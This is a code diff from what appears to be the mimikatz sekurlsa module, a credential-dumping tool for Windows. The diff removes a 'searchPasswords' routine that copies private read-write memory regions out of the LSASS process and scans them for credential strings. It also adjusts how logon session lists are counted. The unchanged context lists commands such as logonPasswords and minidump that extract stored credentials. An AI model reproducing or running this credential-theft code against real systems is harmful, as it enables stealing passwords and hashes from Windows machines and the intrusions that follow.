@@ -13,7 +13,6 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_livessp,	L"livessp",			L"Lists LiveSSP credentials"},
 	{kuhl_m_sekurlsa_ssp,		L"ssp",				L"Lists SSP credentials"},
 	{kuhl_m_sekurlsa_all,		L"logonPasswords",	L"Lists all available providers credentials"},
-	{kuhl_m_sekurlsa_strings,	L"searchPasswords",	L"Search in LSASS memory segments some credentials"},
 
 	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
@@ -128,44 +127,9 @@ NTSTATUS kuhl_m_sekurlsa_clean()
 	return lsassLocalHelper->cleanLocalLib();
 }
 
-BOOL CALLBACK kuhl_m_sekurlsa_enum_range(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg)
-{
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &hBuffer};
-	KULL_M_MEMORY_ADDRESS aLsassMem = {NULL, (PKULL_M_MEMORY_HANDLE) pvArg};
-	PBYTE pZone;
-	PUNICODE_STRING donnees;
-
-	if((pMemoryBasicInformation->Protect & PAGE_READWRITE) && !(pMemoryBasicInformation->Protect & PAGE_GUARD) && (pMemoryBasicInformation->Type == MEM_PRIVATE))
-	{
-		aLsassMem.address = pMemoryBasicInformation->BaseAddress;
-		if(aBuffer.address = LocalAlloc(LPTR, pMemoryBasicInformation->RegionSize))
-		{
-			if(kull_m_memory_copy(&aBuffer, &aLsassMem, pMemoryBasicInformation->RegionSize))
-			{
-				for(pZone = (PBYTE) aBuffer.address; pZone < (PBYTE) aBuffer.address + pMemoryBasicInformation->RegionSize; pZone += sizeof(LONG)) // TODO fixe memory boundary
-				{
-					donnees = (PUNICODE_STRING) pZone;
-					if(kull_m_string_suspectUnicodeStringStructure(&donnees[0]) && kull_m_string_suspectUnicodeStringStructure(&donnees[1]) && kull_m_string_suspectUnicodeStringStructure(&donnees[2]))
-						kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) donnees, NULL, KUHL_SEKURLSA_CREDS_DISPLAY_LINE | KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY | KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE);
-				}
-			}
-			LocalFree(aBuffer.address);
-		}
-	}
-	return TRUE;
-}
-
 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
 {
 	return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages));
-}
-
-NTSTATUS kuhl_m_sekurlsa_strings(int argc, wchar_t * argv[])
-{
-	if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()))
-		kull_m_process_getMemoryInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_enum_range, (PVOID) cLsass.hLsassMem);
-	return STATUS_SUCCESS;
 }
 
 NTSTATUS kuhl_m_sekurlsa_acquireLSA()
@@ -285,7 +249,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMA
 NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
 {
 	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
-	ULONG nbListes = 0, i;
+	ULONG nbListes = 1, i;
 	PVOID pStruct;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &hLocalMemory}, aBuffer = {NULL, &hLocalMemory};
@@ -315,11 +279,8 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			helper++; // yeah, really, I do that =)
 
 		securityStruct.hMemory = cLsass.hLsassMem;
-		securityStruct.address = LogonSessionListCount;
-		
-		if(securityStruct.address)
+		if(securityStruct.address = LogonSessionListCount)
 			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
-		else *(PULONG) data.address = 1;
 
 		for(i = 0; i < nbListes; i++)
 		{
